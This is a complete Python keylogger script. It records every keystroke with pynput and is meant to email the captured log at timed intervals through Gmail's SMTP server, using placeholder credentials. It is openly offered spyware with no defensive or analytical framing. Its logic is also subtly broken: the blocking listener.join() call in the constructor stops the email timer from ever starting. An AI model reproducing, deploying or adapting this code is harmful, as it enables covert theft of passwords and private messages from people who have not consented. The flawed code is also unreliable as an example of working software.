#!/usr/bin/env python
import threading
from pynput import keyboard
import smtplib

class Keylogger:
    def __init__(self, email_address, email_password, email_interval):
        self.log = ""
        self.email_address = email_address
        self.email_password = email_password
        self.email_interval = email_interval
        self.start_keylogger()
        self.schedule_email_report()
    
    def append_to_log(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            else:
                self.log += f"[{key}]"
    
    def process_keystrokes(self):
        print(self.log)  # You can modify this method to perform any processing on the keystrokes
        self.log = ""  # Clear the log after processing
    
    def report_to_email(self):
        if self.log != "":
            subject = "Keylogger Report"
            body = self.log
            message = f"Subject: {subject}\n\n{body}"
            
            try:
                with smtplib.SMTP("smtp.gmail.com", 587) as server:
                    server.starttls()
                    server.login(self.email_address, self.email_password)
                    server.sendmail(self.email_address, self.email_address, message)
                print("Email sent successfully!")
            except Exception as e:
                print(f"Error sending email: {e}")
        
        self.schedule_email_report()
    
    def start_keylogger(self):
        with keyboard.Listener(on_press=self.append_to_log) as listener:
            listener.join()
    
    def schedule_email_report(self):
        threading.Timer(self.email_interval, self.report_to_email).start()

if __name__ == "__main__":
    try:
        email_address = "your_email@gmail.com"  # Your email address
        email_password = "your_email_password"  # Your email password
        
        while True:
            try:
                email_interval = int(input("Enter the time interval for sending emails (in seconds): "))
                if email_interval > 0:
                    break
                else:
                    print("Please enter a positive integer.")
            except ValueError:
                print("Please enter a valid integer.")
        
        keylogger = Keylogger(email_address, email_password, email_interval)
    except KeyboardInterrupt:
        print("Keylogger stopped.")

